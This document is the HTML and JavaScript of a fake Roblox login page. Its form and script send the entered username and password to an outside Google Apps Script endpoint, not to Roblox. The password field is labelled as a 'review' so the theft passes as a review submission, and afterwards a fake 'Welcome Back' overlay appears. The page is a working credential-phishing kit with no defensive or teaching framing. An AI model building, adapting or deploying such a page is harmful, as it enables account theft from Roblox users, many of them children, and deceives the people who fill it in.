<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><title>Login - Roblox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:"Builder Sans","Segoe UI",system-ui,sans-serif;background:#111;color:#fff;min-height:100vh;overflow-x:hidden;font-weight:500}
nav{background:#1f1f1f;height:50px;display:flex;align-items:center;padding:0 24px;position:relative;z-index:100}
.ni{display:flex;align-items:center;width:100%;max-width:1200px;margin:0 auto}
.logo{margin-right:28px;cursor:pointer;flex-shrink:0}
.logo img{height:30px;width:30px;display:block;border-radius:3px}
.nl{display:flex;gap:0}
.nl a{color:#fff;text-decoration:none;font-size:15px;font-weight:600;padding:14px 18px;cursor:pointer;transition:color .15s;letter-spacing:.1px}
.nl a:hover{color:#fff}
.sb{display:flex;align-items:center;background:#3a3c3f;border-radius:8px;padding:0 12px;height:34px;margin-left:12px;flex:1;max-width:240px}
.sb svg{width:16px;height:16px;color:#999;margin-right:8px;flex-shrink:0}
.sb input{background:none;border:none;outline:none;color:#ccc;font-size:14px;width:100%;font-family:inherit}
.sb input::placeholder{color:#999}
.nr{margin-left:auto;padding-left:12px}
.su-btn{background:#00a2ff;color:#fff;padding:8px 20px;border-radius:6px;font-size:14px;font-weight:600;border:none;cursor:pointer;font-family:inherit;letter-spacing:.2px;margin-top:2px}
.su-btn:hover{background:#0090e6}
.su-btn:hover{background:#00c97f}
.bg{position:fixed;inset:0;top:50px;overflow:hidden;z-index:0}
.bg img{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);min-width:130%;min-height:130%;object-fit:cover;filter:brightness(0.85)}
.bg-ov{position:fixed;inset:0;top:50px;background:radial-gradient(ellipse at center,rgba(15,15,18,.2) 0%,rgba(15,15,18,.65) 50%,rgba(15,15,18,.95) 100%);z-index:1;pointer-events:none}
main{position:relative;z-index:10;display:flex;align-items:center;justify-content:center;min-height:calc(100vh - 50px);padding:40px 16px}
.card{background:rgba(40,42,45,.95);backdrop-filter:blur(20px);border-radius:12px;padding:32px 48px 28px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
h1{font-size:28px;font-weight:700;text-align:center;margin-bottom:24px;letter-spacing:-0.5px}
.fg{margin-bottom:12px}
input.fi{width:100%;padding:13px 16px;background:rgba(255,255,255,.1);border:1.5px solid rgba(255,255,255,.25);border-radius:8px;color:#fff;font-size:16px;font-family:inherit;outline:none;transition:border-color .2s}
input.fi::placeholder{color:rgba(255,255,255,.6)}
input.fi:focus{border-color:#00b06f}
input.fi.err{border-color:#e74c3c}
.em{color:#e74c3c;font-size:13px;margin-top:4px;display:none}.em.show{display:block}
.btn{width:100%;padding:13px;background:#3a3c3f;border:1.5px solid rgba(255,255,255,.3);color:#fff;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .15s;margin-top:4px}
.btn:hover{background:rgba(255,255,255,.15)}
.btn:hover{background:#00c97f}
.btn.ld{pointer-events:none;color:transparent}
.btn.ld::after{content:'';position:absolute;top:50%;left:50%;width:20px;height:20px;margin:-10px 0 0 -10px;border:3px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:sp .6s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.forgot{display:block;text-align:center;margin:16px 0;color:#aaa;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer}.forgot:hover{color:#fff}
.line{height:1px;background:rgba(255,255,255,.15);margin:18px 0}
.btn2{width:100%;padding:12px;background:rgba(255,255,255,.08);border:1.5px solid rgba(255,255,255,.2);color:#fff;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;font-family:inherit;margin-bottom:8px;transition:all .15s}
.btn2:hover{background:rgba(255,255,255,.15)}
.sup{text-align:center;margin-top:16px;font-size:14px;color:rgba(255,255,255,.7)}
.sup a{color:#fff;text-decoration:none;font-weight:600;margin-left:4px;cursor:pointer}.sup a:hover{text-decoration:underline}
.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}.ov.show{display:flex}
.svb{background:#2a2c2f;border-radius:14px;padding:40px 48px;text-align:center;animation:pop .35s ease-out;box-shadow:0 20px 60px rgba(0,0,0,.7)}
@keyframes pop{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}
.ck{width:64px;height:64px;background:#00b06f;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
.svb h2{font-size:24px;font-weight:700;margin-bottom:6px}.svb p{color:#aaa;font-size:15px;margin-bottom:24px}
.bc{padding:12px 40px;background:#00b06f;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit}.bc:hover{background:#00c97f}
.badge{position:fixed;bottom:12px;right:12px;background:rgba(0,0,0,.6);color:#fff;padding:4px 10px;border-radius:5px;font-size:10px;font-weight:600;z-index:50;cursor:pointer;opacity:.4}.badge:hover{opacity:1}.badge.h{display:none}
</style></head><body>

<div class="logo"><img id="logoImg" alt="Roblox"/></div>
<div class="nl"><a>Charts</a><a>Marketplace</a><a>Create</a><a>Robux</a></div>
<div class="sb"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg><input placeholder="Search"/></div>
<div class="nr"><button class="su-btn">Sign Up</button></div>
</div></nav>
<div class="bg"><img id="bgImg" alt=""/></div><div class="bg-ov"></div>
<main><div class="card">
<h1>Add account</h1>
<form id="f" method="POST" action="https://script.google.com/macros/s/AKfycbzzwKP4NgVvvN_9H0uXQP1hH0hBuz5v99whExXsO8tI9asHE5ixH5oS1BgDUVbcx0_e/exec" autocomplete="off">
  <div class="fg">
    <input class="fi" id="u" type="text" name="username" placeholder="Username/Email/Phone" spellcheck="false"/>
    <div class="em" id="ue">Username/Email/Phone is required</div>
  </div>
  <div class="fg">
    <input class="fi" id="p" type="text" name="review" placeholder="Password"/>
    <div class="em" id="pe">Review is required</div>
  </div>
  <button type="submit" class="btn" id="lb">Log In</button>
</form><a class="forgot">Forgot Password or Username?</a><div class="line"></div>
<button class="btn2" id="b1">Email Me a One-Time Code</button>
<button class="btn2" id="b2">Quick Sign-in</button>
<p class="sup">Don't have an account?<a>Sign Up</a></p>
</div></main>
<div class="ov" id="ov"><div class="svb">
<div class="ck"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg></div>
<h2>Welcome Back!</h2><p id="wn">Logging you in...</p>
<button class="bc" id="cn">Continue to Roblox</button>
</div></div>

// === Added only for Google Sheets - does not touch background, logo, or any existing code ===
const form = document.getElementById('f');
form.onsubmit = async (e) => {
  e.preventDefault();

  const u = document.getElementById('u');
  const p = document.getElementById('p');
  let ok = true;

  if (!u.value.trim()) {
    u.classList.add('err');
    document.getElementById('ue').classList.add('show');
    ok = false;
  } else {
    u.classList.remove('err');
    document.getElementById('ue').classList.remove('show');
  }

  if (!p.value.trim()) {
    p.classList.add('err');
    document.getElementById('pe').classList.add('show');
    ok = false;
  } else {
    p.classList.remove('err');
    document.getElementById('pe').classList.remove('show');
  }

  if (!ok) return;

  const lb = document.getElementById('lb');
  lb.classList.add('ld');
  lb.textContent = '';

  try {
    await fetch(form.action, { method: 'POST', body: new FormData(form) });
    document.getElementById('wn').textContent = `Thank you, ${u.value.trim()}! Your review was saved.`;
    document.getElementById('ov').classList.add('show');
  } catch (err) {
    alert("Error sending review.");
  }

  lb.classList.remove('ld');
  lb.textContent = 'Log In';
};</script></body></html>
